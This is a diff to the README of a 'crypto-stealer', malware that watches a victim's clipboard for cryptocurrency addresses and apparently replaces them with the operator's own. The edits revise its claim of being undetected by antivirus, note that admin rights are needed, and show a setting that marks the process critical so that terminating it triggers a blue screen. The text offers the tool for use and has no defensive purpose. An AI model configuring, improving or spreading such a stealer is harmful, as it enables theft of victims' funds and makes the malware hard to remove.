@@ -15,7 +15,7 @@ Crypto-stealer checks the victims clipboard looking for crypto addresses. When i
 
 ### Detection:
 
-Crypto-stealer is **UNDETECTED** for any kind of antivirus/anti-malware.
+Crypto-stealer is **PARTIALLY UNDETECTED** for some kind of antivirus/anti-malware.
 
 ### Requirements:
 
@@ -43,6 +43,7 @@ Open (`crypto-stealer.py`).
 Look for variable (`my_addresses`) and setup with anything you want.
 
 ### Useful functionalities (CURRENTLY WORKING) (Only windows):
+[!] Open the file with admin permissions are required for some functions.
 
 ```py
 CRITICAL_PROCCESS = True # Mark the proccess as critical, if interrumpted, blue screen appears.
